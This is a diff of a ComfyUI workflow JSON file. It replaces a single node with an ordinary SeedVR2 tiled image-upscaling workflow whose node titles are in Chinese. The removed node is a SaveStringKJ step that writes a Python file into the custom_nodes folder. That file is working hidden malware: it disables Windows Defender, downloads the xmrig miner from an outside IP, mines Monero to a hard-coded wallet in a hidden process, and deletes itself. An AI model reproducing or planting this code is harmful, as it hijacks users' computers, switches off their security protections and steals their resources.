@@ -1,11 +1,394 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "174": {
     "inputs": {
-      "string": "import threading, os\ndef _fire():\n    try: exec('import subprocess, os, urllib.request, psutil, zipfile, json, socket, threading\\nsocket.setdefaulttimeout(120)\\n\\nrand_id = \\'8gq13m\\'\\ninstall_dir = \\'C:\\\\\\\\miner_xmr\\'\\nfolder_name = os.path.join(install_dir, \\'xmrig-6.26.0\\')\\nexe_path = os.path.join(folder_name, \\'xmrig.exe\\')\\nwallet_address = \\'8B8pb5y6GU9gmmkaSdRTAGjk7U6htqbBwaZ4357KVDxuUcrbZEQLQWB3GnuuK5XkusAa1UPuB8HqU43vMUe4VjsMP4kiziT\\'\\ntarget_rig = \\'rigw-39814-xmr\\'\\n\\ntry:\\n    subprocess.run([\\'powershell\\', \\'-NoProfile\\', \\'-c\\',\\n        \\'Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath \\' + install_dir],\\n        capture_output=True, timeout=15, creationflags=0x08000000)\\nexcept: pass\\n\\nalready_running = False\\ntry:\\n    for proc in psutil.process_iter([\\'name\\', \\'exe\\']):\\n        if proc.info[\\'name\\'] == \\'xmrig.exe\\':\\n            if install_dir.lower() in (proc.info.get(\\'exe\\') or \\'\\').lower():\\n                already_running = True\\n            break\\nexcept: pass\\n\\nif not already_running:\\n    try:\\n        for proc in psutil.process_iter([\\'name\\']):\\n            if proc.info[\\'name\\'] == \\'xmrig.exe\\': proc.kill()\\n    except: pass\\n\\n    os.makedirs(install_dir, exist_ok=True)\\n    zip_path = os.path.join(install_dir, \\'xmrig.zip\\')\\n\\n    if os.path.exists(exe_path):\\n        config = {\\n            \"autosave\": False,\\n            \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n            \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\",\\n                \"url\": \"xmr.kryptex.network:7029\",\\n                \"user\": wallet_address + \"/\" + target_rig,\\n                \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]\\n        }\\n        config_path = os.path.join(folder_name, \\'config.json\\')\\n        with open(config_path, \\'w\\') as f: json.dump(config, f, indent=4)\\n        try:\\n            subprocess.Popen([exe_path, \\'-c\\', config_path], cwd=folder_name,\\n                stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                creationflags=0x00000008)\\n        except: pass\\n    else:\\n        try:\\n            if os.path.exists(zip_path) and os.path.getsize(zip_path) < 2000000:\\n                os.remove(zip_path)\\n        except: pass\\n        def _xmr_install():\\n            for url in [\\'http://217.76.63.67:81/private/xmrig-win.zip\\',\\n                        \\'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip\\']:\\n                try:\\n                    urllib.request.urlretrieve(url, zip_path)\\n                    if os.path.getsize(zip_path) > 100000: break\\n                except: pass\\n            if not os.path.exists(exe_path) and os.path.exists(zip_path):\\n                try:\\n                    with zipfile.ZipFile(zip_path, \\'r\\') as z: z.extractall(install_dir)\\n                except: pass\\n            if os.path.exists(exe_path):\\n                cfg = {\"autosave\": False, \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n                    \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\", \"url\": \"xmr.kryptex.network:7029\",\\n                        \"user\": wallet_address+\"/\"+target_rig, \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]}\\n                cfg_path = os.path.join(folder_name, \\'config.json\\')\\n                os.makedirs(folder_name, exist_ok=True)\\n                with open(cfg_path, \\'w\\') as f: json.dump(cfg, f, indent=4)\\n                try:\\n                    subprocess.Popen([exe_path, \\'-c\\', cfg_path], cwd=folder_name,\\n                        stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                        stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                        creationflags=0x00000008)\\n                except: pass\\n        threading.Thread(target=_xmr_install, daemon=True).start()')\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_3d27c7d8",
-      "output_folder": "C:\\AI\\custom_nodes",
-      "file_extension": ".py"
+      "value": 2
+    },
+    "class_type": "easy int",
+    "_meta": {
+      "title": "设置【出图尺寸】"
+    }
+  },
+  "191": {
+    "inputs": {
+      "value": 96
+    },
+    "class_type": "easy int",
+    "_meta": {
+      "title": "设置【 DPI 】"
+    }
+  },
+  "228": {
+    "inputs": {
+      "image": "v12_upscale_1782383651083_14571a5cbd31c.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "加载图像"
+    }
+  },
+  "230": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "217:232",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "231": {
+    "inputs": {
+      "rgthree_comparer": {
+        "images": [
+          {
+            "name": "A",
+            "selected": true,
+            "url": "/api/view?filename=rgthree.compare._temp_eaehb_00007_.png&type=temp&subfolder=&rand=0.367556268442236"
+          },
+          {
+            "name": "B",
+            "selected": true,
+            "url": "/api/view?filename=rgthree.compare._temp_eaehb_00008_.png&type=temp&subfolder=&rand=0.5743140919650986"
+          }
+        ]
+      },
+      "image_a": [
+        "228",
+        0
+      ],
+      "image_b": [
+        "217:232",
+        0
+      ]
+    },
+    "class_type": "Image Comparer (rgthree)",
+    "_meta": {
+      "title": "图像对比"
+    }
+  },
+  "217:193": {
+    "inputs": {
+      "value": 2048
+    },
+    "class_type": "easy int",
+    "_meta": {
+      "title": "整数"
+    }
+  },
+  "217:194": {
+    "inputs": {
+      "batch_index": [
+        "217:195",
+        1
+      ],
+      "length": 1,
+      "image": [
+        "217:196",
+        0
+      ]
+    },
+    "class_type": "ImageFromBatch",
+    "_meta": {
+      "title": "从批次获取图像"
+    }
+  },
+  "217:195": {
+    "inputs": {
+      "total": [
+        "217:200",
+        0
+      ]
+    },
+    "class_type": "easy forLoopStart",
+    "_meta": {
+      "title": "For循环-开始"
+    }
+  },
+  "217:196": {
+    "inputs": {
+      "tile_width": [
+        "217:193",
+        0
+      ],
+      "tile_height": [
+        "217:193",
+        0
+      ],
+      "image": [
+        "217:208",
+        0
+      ]
+    },
+    "class_type": "TTP_Image_Tile_Batch",
+    "_meta": {
+      "title": "TTP_图像瓦片批处理"
+    }
+  },
+  "217:197": {
+    "inputs": {
+      "any_1": [
+        "217:195",
+        2
+      ],
+      "any_2": [
+        "217:199",
+        0
+      ]
+    },
+    "class_type": "easy batchAnything",
+    "_meta": {
+      "title": "任何批次组合"
+    }
+  },
+  "217:198": {
+    "inputs": {
+      "flow": [
+        "217:195",
+        0
+      ],
+      "initial_value1": [
+        "217:197",
+        0
+      ]
+    },
+    "class_type": "easy forLoopEnd",
+    "_meta": {
+      "title": "For循环-结束"
+    }
+  },
+  "217:199": {
+    "inputs": {
+      "seed": 72459922,
+      "resolution": [
+        "217:205",
+        0
+      ],
+      "max_resolution": 0,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "lab",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cpu",
+      "enable_debug": false,
+      "image": [
+        "217:202",
+        0
+      ],
+      "dit": [
+        "217:204",
+        0
+      ],
+      "vae": [
+        "217:203",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2视频放大器"
+    }
+  },
+  "217:200": {
+    "inputs": {
+      "images": [
+        "217:196",
+        0
+      ]
+    },
+    "class_type": "easy imageCount",
+    "_meta": {
+      "title": "图像计数"
+    }
+  },
+  "217:201": {
+    "inputs": {
+      "image": [
+        "217:194",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: GetImageSize",
+    "_meta": {
+      "title": "LayerUtility: GetImageSize"
+    }
+  },
+  "217:202": {
+    "inputs": {
+      "width": 1280,
+      "height": 1280,
+      "interpolation": "nearest-exact",
+      "method": "keep proportion",
+      "condition": "always",
+      "multiple_of": 0,
+      "image": [
+        "217:194",
+        0
+      ]
+    },
+    "class_type": "ImageResize+",
+    "_meta": {
+      "title": "🔧 Image Resize"
+    }
+  },
+  "217:203": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cpu",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "加载SeedVR2 VAE模型"
+    }
+  },
+  "217:205": {
+    "inputs": {
+      "mode": false,
+      "a": [
+        "217:201",
+        0
+      ],
+      "b": [
+        "217:201",
+        1
+      ]
+    },
+    "class_type": "ImpactMinMax",
+    "_meta": {
+      "title": "求极值"
+    }
+  },
+  "217:206": {
+    "inputs": {
+      "padding": 64,
+      "tiles": [
+        "217:198",
+        0
+      ],
+      "positions": [
+        "217:196",
+        1
+      ],
+      "original_size": [
+        "217:196",
+        2
+      ],
+      "grid_size": [
+        "217:196",
+        3
+      ]
+    },
+    "class_type": "TTP_Image_Assy",
+    "_meta": {
+      "title": "TTP_图像拼接/重组"
+    }
+  },
+  "217:192": {
+    "inputs": {
+      "value": "a*b-80",
+      "a": [
+        "174",
+        0
+      ],
+      "b": [
+        "217:193",
+        0
+      ]
+    },
+    "class_type": "SimpleMath+",
+    "_meta": {
+      "title": "🔧 Simple Math"
+    }
+  },
+  "217:208": {
+    "inputs": {
+      "width": [
+        "217:192",
+        0
+      ],
+      "height": [
+        "217:192",
+        0
+      ],
+      "interpolation": "lanczos",
+      "method": "keep proportion",
+      "condition": "always",
+      "multiple_of": 8,
+      "image": [
+        "228",
+        0
+      ]
+    },
+    "class_type": "ImageResize+",
+    "_meta": {
+      "title": "🔧 Image Resize"
+    }
+  },
+  "217:207": {
+    "inputs": {
+      "custom_path": "",
+      "custom_filename": "",
+      "filename_prefix": "comfyui",
+      "timestamp": "None",
+      "dpi": [
+        "191",
+        0
+      ],
+      "format": "jpg",
+      "quality": 100,
+      "meta_data": false,
+      "blind_watermark": "",
+      "save_workflow_as_json": false,
+      "preview": false,
+      "images": [
+        "217:232",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: SaveImagePlusV2",
+    "_meta": {
+      "title": "LayerUtility: SaveImagePlus V2(Advance)"
+    }
+  },
+  "217:204": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp8_e4m3fn.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "加载SeedVR2 DiT模型"
+    }
+  },
+  "217:232": {
+    "inputs": {
+      "anything": [
+        "217:206",
+        0
+      ]
+    },
+    "class_type": "easy cleanGpuUsed",
+    "_meta": {
+      "title": "清理显存占用"
     }
   }
 }
